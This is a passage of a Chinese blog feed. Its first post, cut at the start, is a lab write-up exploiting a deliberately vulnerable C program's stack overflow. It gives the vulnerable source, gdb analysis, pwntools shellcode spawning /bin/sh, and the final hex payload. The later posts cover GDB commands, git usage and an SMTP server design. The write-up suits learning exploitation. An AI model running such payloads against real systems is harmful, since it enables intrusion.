class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Discription:</span></span><br><span class="line"><span class="comment">   [vul]--&gt; stack overflow vulnerability</span></span><br><span class="line"><span class="comment">   [solve clue]--&gt; use bof to execute shellcode in the stack</span></span><br><span class="line"><span class="comment">   [writer]--&gt; carter   2018.5.20</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> alarm_time 500</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> filter_num 2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">alarm(alarm_time);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">egg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//__asm__ ("jmp *-0x30(%rsp);");</span></span><br><span class="line">__asm__(<span class="string">"sub rsp,0x30;jmp rsp;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_input</span><span class="params">(<span class="keyword">char</span> *ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> filter[<span class="number">8</span>] = &#123;<span class="string">'\xaa'</span>,<span class="string">'\xbb'</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;filter_num;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="built_in">strlen</span>(ss);j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ss[j]==filter[i])</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bof</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> content[<span class="number">48</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Input your content: "</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>,content,<span class="number">60</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(content)&gt;=<span class="number">48</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Detect bof!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!check_input(content))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">init();</span><br><span class="line">bof();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>源代码分析</p><ol><li>main函数调用init函数和bof函数；</li><li>init函数的功能是初始化，设置了输入输出流和程序限定时间；</li><li>bof函数：<ol><li>声明一个长度位48的字符串数组；</li><li>输出字符串<code>Input your content:</code>；</li><li>调用read函数，读取60个字符，放入字符串数组content中；</li><li>判断字符串数组content的长度是否大于48，如果超过48，则输出<code>Detect bof!</code>，并且异常退出；</li><li>调用check_input函数，检查字符串中是否包含<code>\xaa</code>、<code>\xbb</code>，如果包含，则异常退出；</li></ol></li><li>egg函数通过降低地址扩展栈空间；</li></ol></li><li><p>漏洞利用</p><p>字符串数组content长度为48，输入的字符数为60，造成字符串溢出，可以使用<code>0x00</code>绕过限制48个字符的判断；</p></li><li><p>分析过程</p><ol><li><p>使用checksec工具查看二进制代码的保护，Stack没有保护措施，可以利用栈溢出攻击，NX显示disabled，有执行栈上代码的权限；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570784221146.png" alt="1570784221146"></p></li><li><p>使用gdb调试sc2；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570786458697.png" alt="1570786458697"></p></li><li><p>由于在bof函数中存在输入点，因此在bof函数入口点设置断点，查看栈信息得到栈基址地址为<code>0x7fffffffe0f0</code>，栈顶地址为<code>0x7fffffffe0e8</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868262705.png" alt="1570868262705"></p><p>查看字符串溢出点的位置，构造简单的shellcode，其中使用<code>\x00</code>绕过长度检测；</p></li><li><pre><code class="shell">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x70<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![1570868550702](https:&#x2F;&#x2F;leeyuxun-1258157351.cos.ap-beijing.myqcloud.com&#x2F;img&#x2F;1570868550702.png)</span><br><span class="line"></span><br><span class="line">5. 在gdb中执行该shellcode，出现错误，程序试图访问&#96;0x59585756&#96;这个地址，而该地址正是上述shellcode中的内容，在该位置填入目的地址，即可跳转到相应的地址执行代码；</span><br><span class="line"></span><br><span class="line">   ![1570868725103](https:&#x2F;&#x2F;leeyuxun-1258157351.cos.ap-beijing.myqcloud.com&#x2F;img&#x2F;1570868725103.png)</span><br><span class="line"></span><br><span class="line">6. 查看栈信息发现栈基址地址rbp被shellcode中的内容&#96;\x48\x49\x50\x51\x52\x53\x54\x55&#96;覆盖，栈顶地址rsp编变成了&#96;0x7fffffffe1a0&#96;；</span><br><span class="line"></span><br><span class="line">   ![1570868795483](https:&#x2F;&#x2F;leeyuxun-1258157351.cos.ap-beijing.myqcloud.com&#x2F;img&#x2F;1570868795483.png)</span><br><span class="line"></span><br><span class="line">7. 查看栈中内存情况发现输入的shellcode从地址&#96;0x7fffffffeb0&#96;开始存储；</span><br><span class="line"></span><br><span class="line">   ![1570868967865](https:&#x2F;&#x2F;leeyuxun-1258157351.cos.ap-beijing.myqcloud.com&#x2F;img&#x2F;1570868967865.png)</span><br><span class="line"></span><br><span class="line">8. 由于只能修改地址的低8位, 不能修改地址的高8位，显然直接覆盖返回地址来到达相应的栈空间是不可能的，只能通过跳板指令到达相应的栈地址，搜索跳板指令，发现一个&#96;jmp rsp&#96;指令；</span><br><span class="line"></span><br><span class="line">   ![1570803761072](https:&#x2F;&#x2F;leeyuxun-1258157351.cos.ap-beijing.myqcloud.com&#x2F;img&#x2F;1570803761072.png)</span><br><span class="line"></span><br><span class="line">9. 根据程序源码，这个&#96;jmp rsp&#96;仅存在egg函数中；</span><br><span class="line"></span><br><span class="line">   &#96;&#96;&#96;c</span><br><span class="line">   void egg()</span><br><span class="line">   &#123;</span><br><span class="line">   &#x2F;&#x2F;__asm__ (&quot;jmp *-0x30(%rsp);&quot;);</span><br><span class="line">   __asm__(&quot;sub rsp,0x30;jmp rsp;&quot;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>上述代码将rsp降低了0x30，到地址`0x7fffffffe170`处，可以设计shellcode将其覆盖；</code></pre></li><li><p>egg函数地址为<code>0x400798</code>，<code>sub 0x30,rsp</code>地址为<code>0x40079c</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570863363546.png" alt="1570863363546"></p></li><li><p>利用pwntools的工具shellcraft生成shellcode，生成shellcode的代码shellcode.py如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.os = <span class="string">"linux"</span></span><br><span class="line">payload = asm(shellcraft.amd64.linux.execve(<span class="string">'/bin/sh\x00'</span>))<span class="comment">#可执行ls/cd等指令</span></span><br><span class="line">file = open(<span class="string">"shellcode.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure></li><li><p>执行shellcode.py得到十六机制编码如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570808000533.png" alt="1570808000533"></p></li><li><p>由于需要绕过只能输入48个字符串和不能出现<code>0xaa</code>、<code>0xbb</code>，对shellcode进一步完善如下；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05\x90\x90\x90\x9c\x07\x40\x00</span><br></pre></td></tr></table></figure><p>其中s<code>\x00</code>是绕过长度检查位于<code>0x7ffffffe0b0</code>处，<code>\x90</code>用于长度填充，末尾的<code>\x9c\x07\x04\x00</code>是<code>sub 0x30,rsp</code>的地址</p></li><li><p>输入命令<code>cat shellcode - | ./sc2</code>运行shellcode，可执行<code>ls</code>、<code>cd</code>等指令；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570869598910.png" alt="1570869598910"></p></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析技术实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB命令简介</title>
      <link href="/GDB%E5%91%BD%E4%BB%A4%E7%AE%80%E4%BB%8B.html"/>
      <url>/GDB%E5%91%BD%E4%BB%A4%E7%AE%80%E4%BB%8B.html</url>
      
        <content type="html"><![CDATA[<p>GDB命令简单总结。<a id="more"></a></p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><style>     table     th:first-of-type {     width: 20%; }     th:nth-of-type(2) {     width: 55%; }    th:nth-of-type(3) {     width: 25%; }</style><table><thead><tr><th align="left">命令</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td align="left">file &lt;文件名&gt;</td><td>加载被调试的可执行程序文件。<br />一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径。</td><td>(gdb) file gdb-sample</td></tr><tr><td align="left">r</td><td>Run的简写，运行被调试的程序。<br/>如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。</td><td>(gdb) r</td></tr><tr><td align="left">c</td><td>Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。</td><td>(gdb) c</td></tr><tr><td align="left">b &lt;行号&gt; <br />b &lt;函数名称&gt; <br />b *&lt;函数名称&gt; <br />b *&lt;代码地址&gt; <br />d [编号]</td><td>b: Breakpoint的简写，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。<br/>其中在函数名称前面加“*”符号表示将断点设置在“由编译器生成的prolog代码处”。如果不了解汇编，可以不予理会此用法。<br/>d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。</td><td>(gdb) b 8 <br />(gdb) b main <br />(gdb) b *main <br />(gdb) b *0x804835c</td></tr><tr><td align="left">s, n</td><td>s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；<br /> n: 执行一行源程序代码，此行代码中的函数调用也一并执行；<br />s 相当于其它调试器中的“Step Into (单步跟踪进入)”； <br />n 相当于其它调试器中的“Step Over (单步跟踪)”。<br />这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。</td><td>(gdb) s<br/>(gdb) n</td></tr><tr><td align="left">si, ni</td><td>si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。</td><td>(gdb) si<br/>(gdb) ni</td></tr><tr><td align="left">p &lt;变量名称&gt;</td><td>Print的简写，显示指定变量（临时变量或全局变量）的值。</td><td>(gdb) p i<br/>(gdb) p nGlobalVar</td></tr><tr><td align="left">display … <br />undisplay &lt;编号&gt;</td><td>display，设置程序中断后欲显示的数据及其格式。<br />例如，如果希望每次程序中断后可以看到即将被执行的下一条汇编指令，可以使用命令<code>display /i $pc</code>其中<code>$pc</code>代表当前汇编指令，<code>/i</code>表示以十六进行显示。当需要关心汇编代码时，此命令相当有用。<br />undispaly，取消先前的display设置，编号从1开始递增。</td><td>(gdb) display /i $pc<br />(gdb) undisplay 1</td></tr><tr><td align="left">i</td><td>Info的简写，用于显示各类信息，详情请查阅“help i”。</td><td>(gdb) i r</td></tr><tr><td align="left">q</td><td>Quit的简写，退出GDB调试环境。</td><td>(gdb) q</td></tr><tr><td align="left">help [命令名称]</td><td>GDB帮助命令，提供对GDB名种命令的解释说明。<br/>如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。</td><td>(gdb) help display</td></tr></tbody></table><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>未完待续—</p>]]></content>
      
      
      <categories>
          
          <category> 工具教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地代码更新到Github</title>
      <link href="/%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%9B%B4%E6%96%B0%E5%88%B0Github.html"/>
      <url>/%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%9B%B4%E6%96%B0%E5%88%B0Github.html</url>
      
        <content type="html"><![CDATA[<h1 id="本地代码更新到Github"><a href="#本地代码更新到Github" class="headerlink" title="本地代码更新到Github"></a>本地代码更新到Github</h1><a id="more"></a><ol><li><p>查看当前的git仓库状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure></li><li><p>更新全部</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add *</span><br></pre></td></tr></table></figure></li><li><p>进行<code>commit</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">"更新说明"</span></span><br></pre></td></tr></table></figure></li><li><p>拉取当前分支最新代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure></li><li><p>push到远程master分支上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure></li></ol><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1.jpg" alt="1"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/2.jpg" alt="2"></p>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言编写简单邮箱服务器</title>
      <link href="/C%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E7%AE%80%E5%8D%95%E9%82%AE%E7%AE%B1%E6%9C%8D%E5%8A%A1%E5%99%A8.html"/>
      <url>/C%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E7%AE%80%E5%8D%95%E9%82%AE%E7%AE%B1%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验内容和实验环境描述"><a href="#实验内容和实验环境描述" class="headerlink" title="实验内容和实验环境描述"></a>实验内容和实验环境描述</h1><h2 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h2><p>使用<code>Socket API</code>编写一个<code>SMTP</code>邮件服务器程序。</p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><ol><li>作为<code>SMTP</code>服务器，接收邮件客户端程序的<code>TCP</code>连接请求，接收<code>SMTP</code>命令和邮件数据，将邮件保存在文件中；</li><li>作为<code>SMTP</code>客户端，建立到实际邮件服务器的<code>TCP</code>连接，发送<code>SMTP</code>命令，将保存的邮件发送给实际邮件服务器；</li><li>提供邮件差错报告：将实际邮件服务器的差错报告转发给邮件客户端软件；</li><li>支持一封邮件多个接收者，要求接收者属于不同的域（如<code>bupt.edu.cn</code>、<code>163.com</code>、<code>aliyun.com</code>,…）；</li><li>提供发件人和收件人Email地址格式检查功能，例如下列邮件地址是错误的：<code>chengli</code>，<code>chengli@</code>，<code>bupt.edu.cn</code>， …. <a id="more"></a></li></ol><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><code>DEV C++</code></p><h1 id="软件设计"><a href="#软件设计" class="headerlink" title="软件设计"></a>软件设计</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>数据结构是整个程序的要点之一，程序维护者充分了解数据结构就可以对主要算法和处理流程有个基本的理解。下面描述程序中定义的全局变量和函数中的变量的变量名和变量所起的作用以及程序定义的标识符含义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> ehlo[BUFSIZE]; <span class="comment">//存客户端ehlo，用于连接真实的邮箱服务器 </span></span><br><span class="line"><span class="keyword">char</span> mailFrom[BUFSIZE];     <span class="comment">//存客户端邮箱 </span></span><br><span class="line"><span class="keyword">char</span> rcptTo[<span class="number">5</span>] [BUFSIZE];   <span class="comment">//存目的邮箱</span></span><br><span class="line"><span class="keyword">char</span> clientIP[<span class="number">5</span>] [BUFSIZE]; <span class="comment">//客户端服务器ip地址 </span></span><br><span class="line"><span class="keyword">char</span> ip[BUFSIZE];           <span class="comment">//暂时存每次用户输入的IP地址</span></span><br><span class="line"><span class="keyword">char</span> data[BUFSIZE];         <span class="comment">//存Data</span></span><br><span class="line"><span class="keyword">char</span> imf[BUFSIZE * <span class="number">10</span>];     <span class="comment">//存邮件标准格式</span></span><br><span class="line"><span class="keyword">char</span> recvData[BUFSIZE];     <span class="comment">//暂时存接收数据</span></span><br><span class="line"><span class="keyword">char</span> rcptJudge[BUFSIZE];    <span class="comment">//用于判断目的邮箱数量 </span></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;                  <span class="comment">//记录目的邮箱数量 </span></span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;                  <span class="comment">//记录目标邮箱数量 </span></span><br><span class="line"><span class="keyword">int</span> error;                  <span class="comment">//判断调用客户端函数是否成功 </span></span><br><span class="line"><span class="keyword">int</span> now[<span class="number">6</span>];                 <span class="comment">//记录时间</span></span><br><span class="line"><span class="keyword">char</span> fname[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;      <span class="comment">//记录创建txt文件的文件名</span></span><br><span class="line">FILE *fp;                   <span class="comment">//打开文件 </span></span><br><span class="line"><span class="keyword">char</span> nativeIP[BUFSIZE];     <span class="comment">//存本机IP</span></span><br><span class="line"><span class="keyword">char</span> temp[<span class="number">3</span>];               <span class="comment">//存状态码 </span></span><br><span class="line"><span class="keyword">char</span> username[BUFSIZE];    <span class="comment">//存登陆用户名</span></span><br><span class="line"><span class="keyword">char</span> password[BUFSIZE];     <span class="comment">//存登陆密码</span></span><br><span class="line">r1-r28                      <span class="comment">//smtp协议通信过程中的状态码</span></span><br><span class="line">BUFSIZE                     <span class="comment">//为缓冲区大小4096</span></span><br><span class="line">PORT                        <span class="comment">//为端口号25</span></span><br></pre></td></tr></table></figure><h2 id="模块结构"><a href="#模块结构" class="headerlink" title="模块结构"></a>模块结构</h2><h3 id="子程序"><a href="#子程序" class="headerlink" title="子程序"></a>子程序</h3><p>程序所设计的子程序所完成的功能，和每个参数的意义。</p><ol><li><p><code>int main()</code>——主函数<br>功能：调用Server服务器函数并判断其调用是否成功；若成功则继续调用Client客户端函数并判断其是否调用成功。</p></li><li><p><code>int server()</code>——服务器函数<br>功能：起到SMTP服务器的作用，接收邮件客户端程序的TCP连接请求，接     收SMTP命令和邮件数据，将邮件保存在文件中，并生成日志。</p><p>参数意义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>  Ret;<span class="comment">//用于判断初始化WSADATA是否成功</span></span><br><span class="line">WSADATA  wsaData;<span class="comment">//用来存储被WSAStartup函数调用后返回的WindowsSockets数据</span></span><br><span class="line">SOCKET  ListeningSocket;<span class="comment">//用于监听客户机连接的套接字</span></span><br><span class="line">SOCKET  socketConnection;<span class="comment">//用于与客户机连接的套接字 </span></span><br><span class="line">SOCKADDR_IN  ServerAddr;<span class="comment">//存储服务器地址 </span></span><br><span class="line">SOCKADDR_IN  ClientAddr;<span class="comment">//存储客户端地址 </span></span><br><span class="line"><span class="keyword">int</span>  ClientAddrLen = <span class="keyword">sizeof</span>(ClientAddr);<span class="comment">//存储客户端地址长度 </span></span><br><span class="line"><span class="keyword">int</span>  flag = <span class="number">1</span>;<span class="comment">//判断是否可以连接</span></span><br></pre></td></tr></table></figure></li><li><p><code>int client()</code>——客户端函数<br>功能：将程序作为SMTP客户端，建立到实际邮件服务器的TCP连接，发送     SMTP命令，将保存的邮件发送给实际邮件服务器；</p><p>参数意义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>  Ret1;<span class="comment">//用于判断初始化WSADATA是否成功</span></span><br><span class="line">WSADATA  wsaData1;<span class="comment">//用来存储被WSAStartup函数调用后返回的Windows Sockets数据</span></span><br><span class="line">SOCKET  socketclient;<span class="comment">//服务器的套接字 </span></span><br><span class="line">SOCKADDR_IN  nativeAddr;<span class="comment">//用于存储本地ip地址 </span></span><br><span class="line">SOCKADDR_IN  clientAddr1;<span class="comment">//用于存储客户端ip地址</span></span><br></pre></td></tr></table></figure></li><li><p><code>int validEmail(char*addr)</code>——收发件邮箱地址合法性监测</p><p>功能：提供发件人和收件人Email地址格式检查功能，例如下列邮件地址是错误的：<code>chengli</code>，<code>chengli@</code>，<code>bupt.edu.cn</code>， …. </p><p>参数意义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>  colonAddr = <span class="number">0</span>;        <span class="comment">//记录“:”所在位置</span></span><br><span class="line"><span class="keyword">int</span>  atAddr = <span class="number">0</span>;           <span class="comment">//记录“@”所在位置</span></span><br><span class="line"><span class="keyword">int</span>  pointAddr = <span class="number">0</span>;        <span class="comment">//记录“.”所在位置 </span></span><br><span class="line"><span class="keyword">int</span>  bracketAddr = <span class="number">0</span>;      <span class="comment">//记录“&gt;”所在位置</span></span><br><span class="line"><span class="keyword">int</span>  error1 = <span class="number">0</span>;           <span class="comment">//返回值</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a = <span class="number">0</span>;        <span class="comment">//计数器</span></span><br></pre></td></tr></table></figure></li><li><p><code>char* getIP()</code></p><p>功能：获取邮箱客户端ip地址 ；</p><p>参数意义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>*  hostIP;<span class="comment">//函数内保存本地IP</span></span><br><span class="line"><span class="keyword">char</span>  hostName[<span class="number">256</span>];<span class="comment">//保存邮箱客户端主机名称</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hostEntry</span>;</span><span class="comment">//将邮箱客户端主机名称转换为IP*</span></span><br></pre></td></tr></table></figure></li><li><p><code>*char*  translateIP(char*mail)</code> </p><p>功能：将源邮箱服务器地址转换为ip地址；</p><p>参数意义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> ip[<span class="number">100</span>] = &#123; <span class="string">"smtp."</span> &#125;;<span class="comment">//将smtp.存储下来方便找到服务器域名</span></span><br><span class="line"><span class="keyword">char</span>* IP;<span class="comment">//保存邮箱服务器IP </span></span><br><span class="line"><span class="keyword">int</span> atAddr = <span class="number">0</span>;<span class="comment">//记录”@ ”所在位置</span></span><br><span class="line"><span class="keyword">int</span> bracketAddr = <span class="number">0</span>;<span class="comment">//记录”&gt; “所在位置</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> x = <span class="number">0</span>;<span class="comment">//计数器</span></span><br><span class="line"><span class="keyword">int</span> y = <span class="number">5</span>;<span class="comment">//计数器</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hostEntry</span>;</span><span class="comment">//找出客户端邮箱服务器的IP</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> **<span class="title">addr_list</span>;</span><span class="comment">//将找到的IP进行格式转换</span></span><br></pre></td></tr></table></figure></li><li><p><code>int time1()</code>——时间戳函数</p><p>功能：获取当前时间，方便记录日志文件 </p><p>参数意义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">time_t</span>  t;     <span class="comment">//用来存储时间</span></span><br><span class="line">time(&amp;t);     <span class="comment">//获取时间戳</span></span><br><span class="line">lt = localtime(&amp;t);     <span class="comment">//转为时间结构</span></span><br></pre></td></tr></table></figure></li><li><p><code>void Error()</code>——判断错误类型</p><p>功能：提供差错报告，将实际邮件服务器的差错报告转发给邮件客户端软件                 </p></li></ol><h3 id="子程序之间的程序关系调用图"><a href="#子程序之间的程序关系调用图" class="headerlink" title="子程序之间的程序关系调用图"></a>子程序之间的程序关系调用图</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570456967883.png" alt="1570456967883"></p><h2 id="算法流程"><a 